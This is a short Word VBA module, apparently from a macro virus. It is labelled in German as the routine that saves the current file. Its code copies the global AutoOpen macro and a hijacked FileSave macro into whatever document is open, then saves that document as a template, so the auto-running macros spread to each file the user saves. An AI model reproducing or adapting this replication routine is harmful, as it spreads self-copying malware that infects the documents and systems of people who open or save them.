   Attribute VB_Name = "Makrone"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Speichert die aktuelle Datei oder Dokumentvorlage."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Makrone.MAIN"
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Global:DateiSpeichern", WordBasic.[FileName$]() + ":Makrone"
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   End Sub
